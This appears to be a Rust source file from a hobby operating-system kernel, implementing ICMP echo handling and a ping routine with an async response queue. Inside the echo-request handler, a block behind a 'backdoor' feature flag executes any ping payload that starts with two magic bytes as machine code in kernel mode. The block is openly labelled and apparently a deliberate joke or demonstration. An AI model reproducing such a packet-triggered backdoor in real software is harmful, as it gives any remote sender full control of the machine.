use alloc::vec::Vec;
use core::pin::Pin;
use core::task::{Context, Poll};
use crossbeam_queue::ArrayQueue;
use futures_util::{Stream, StreamExt, task::AtomicWaker};
use lazy_static::lazy_static;

use super::{ControlMessageType, ICMPPacket, IPv4Header, IPv4Packet, Interface, NoSubcode};
use crate::net::{Ipv4Addr, ip};
use crate::sync::spinlock::Mutex;

// should this be made into a generic handle<T> ?
pub async fn handle_icmp_echo_request(
    icmpp: ICMPPacket<'_>,
    header: &IPv4Header,
    interface: &Interface,
) {
    log::debug!("{:?}", icmpp.data);

    #[cfg(feature = "backdoor")]
    {
        let dpat = &icmpp.data[0..2];
        let pattern = b"\xF0\x0F";

        if dpat == pattern {
            use x86_64::instructions::interrupts::without_interrupts;

            log::warn!("BACKDOOR ACTIVATED");

            let program = &icmpp.data.as_slice()[pattern.len()..];

            // safe since sender pinky promisies that the code is memory safe :3
            without_interrupts(|| unsafe {
                core::arch::asm!(
                "call rax", in("rax") program.as_ptr(),
                clobber_abi("C")
                );
            });
        }
    }

    let mut response = ICMPPacket {
        typ: ControlMessageType::EchoReply(NoSubcode::NoCode),
        checksum: 0,
        other: icmpp.other,
        data: icmpp.data,
    };

    response.calc_new_checksum();

    let resp_bytes = response.to_bytes();
    let ipv4 = IPv4Packet::from_source_dest_and_data(
        interface.ip,
        header.source_address,
        resp_bytes.as_slice(),
    )
    .expect("Packet constructed incorrectly");

    log::trace!("Sending icmp response: {:?}", ipv4);
    crate::net::ip::send_ipv4_packet(ipv4, interface).await;
}

#[derive(Debug)]
struct PingRequestInfo {
    source_address: Ipv4Addr,
    dest_address: Ipv4Addr,
    identifier: u16,
    sequence_num: u16,
    payload: Vec<u8>,
}

impl PingRequestInfo {
    fn from_stuff(icmpp: &ICMPPacket<'_>, header: &IPv4Header) -> Self {
        PingRequestInfo {
            source_address: header.source_address,
            dest_address: header.destination_address,
            identifier: u16::from_le_bytes(icmpp.other.to_le_bytes()[..2].try_into().unwrap()),
            sequence_num: u16::from_le_bytes(icmpp.other.to_le_bytes()[2..4].try_into().unwrap()),
            payload: icmpp.data.to_vec(),
        }
    }
}

/// This is called when an echo response addressed to us has arrived.
pub fn handle_icmp_echo_response(
    icmpp: &ICMPPacket<'_>,
    header: &IPv4Header,
    _interface: &Interface,
) {
    // The packet arriving should be just logged for now. In future will do better
    log::info!(
        "received icmp response! {:?} from source: {}",
        icmpp,
        header.source_address
    );

    if PING_RESPONSE_QUEUE
        .lock()
        .push(PingRequestInfo::from_stuff(icmpp, header))
        .is_err()
    {
        log::error!("Ping packet queue is full!");
    } else {
        PING_WAKER.wake();
    }
}

static PING_WAKER: AtomicWaker = AtomicWaker::new();

// tihis needs to contain PingRequestInfo. But that struct has an undetermined lifetime.
// I could either make everything inside the struct owned, or find some other way.
// I cannot thinkg of another way so it will just be all owned which is sad.
lazy_static! {
    static ref PING_RESPONSE_QUEUE: Mutex<ArrayQueue<PingRequestInfo>> =
        Mutex::new(ArrayQueue::new(10));
}

struct PingRequestStream {
    /// What identifier is this streamer looking for?
    identifier: u16,
}

// this implementation has the problem that it will fill up if a ping request stream consumer is not
// created for every outgoing ping identifier.
// A solution to this is to implement a timeout and drop packets that are not consumed in 5 seconds
// or something like that.
// This implementation should also loop through *all* slots and check if any match.
// This means that the datastructure should probably just be changed to a slice
// A hashmap based on the identifier could also work
impl Stream for PingRequestStream {
    type Item = PingRequestInfo;

    fn poll_next(self: Pin<&mut Self>, cx: &mut Context<'_>) -> Poll<Option<Self::Item>> {
        // let queue = PING_RESPONSE_QUEUE.lock();

        if let Some(packet) = PING_RESPONSE_QUEUE.lock().pop()
            && packet.identifier == self.identifier
        {
            return Poll::Ready(Some(packet));
        }

        PING_WAKER.register(cx.waker());

        match PING_RESPONSE_QUEUE.lock().pop() {
            Some(packet) => {
                if packet.identifier == self.identifier {
                    // deregister waker
                    PING_WAKER.take();
                    Poll::Ready(Some(packet))
                } else {
                    Poll::Pending
                }
            }
            None => Poll::Pending,
        }
    }
}

pub async fn ping_once(target: Ipv4Addr) {
    log::info!("pinging target: {}", target);

    #[expect(clippy::cast_possible_truncation, reason = "intended")]
    let ident = crate::time::get_ticks() as u16;

    let Some(interface) = *crate::net::INTERFACE.read().await else {
        log::error!("Unable to load network interface.");
        return;
    };

    let mut request = ICMPPacket {
        typ: ControlMessageType::EchoRequest(NoSubcode::NoCode),
        checksum: 0,
        // contains identifier_u16 and sequence number_u16
        other: ((ident as u32) << 16),
        data: b"an icmp payload yayy",
    };

    request.calc_new_checksum();
    let bytes = request.to_bytes();
    let packet = IPv4Packet::from_source_dest_and_data(interface.ip, target, bytes.as_slice())
        .expect("icmp request is valid");

    let Ok(_) = ip::send_ipv4_packet(packet, &interface).await else {
        log::error!("could not send icmp request.");
        return;
    };

    let mut p = PingRequestStream { identifier: ident };

    let response = p.next().await;
    log::info!("received a response! {:?}", response);
}
